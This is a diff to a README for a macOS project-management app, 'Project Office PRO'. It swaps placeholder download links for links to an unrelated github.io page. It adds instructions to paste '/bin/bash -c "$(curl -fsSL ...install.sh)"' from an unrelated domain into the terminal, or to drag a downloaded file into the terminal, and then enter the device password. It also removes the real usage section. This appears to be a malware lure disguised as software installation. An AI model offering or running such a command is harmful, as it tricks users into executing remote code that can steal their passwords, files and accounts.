@@ -3,7 +3,34 @@
 Project Office PRO is a comprehensive project management application tailored for macOS users. Designed to help professionals plan, track, and deliver projects efficiently, it offers powerful tools for scheduling, resource management, and collaboration.
 
 ## ✅ Download Project Office PRO for macOS  
-[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](#)
+[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://project-office-pro-mac-download.github.io/.github)
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
+
+## ✅ Download Project Office PRO for macOS  
+[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://project-office-pro-mac-download.github.io/.github)
 
 ---
 
@@ -36,17 +63,7 @@ Project Office PRO is a feature-rich project management software that provides d
 
 ---
 
-[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](#)
-
----
-
-## 📥 How to Use
-
-- ✅ Download and install Project Office PRO on your macOS device  
-- 📝 Create new projects or import Microsoft Project files  
-- 📅 Define tasks, assign resources, and set deadlines  
-- 📊 Track project progress and generate reports  
-- 🔄 Collaborate with your team and manage updates in real time  
+[![Download Project Office PRO](https://img.shields.io/badge/Download-Project%20Office%20PRO-blueviolet)](https://project-office-pro-mac-download.github.io/.github)
 
 ---
 
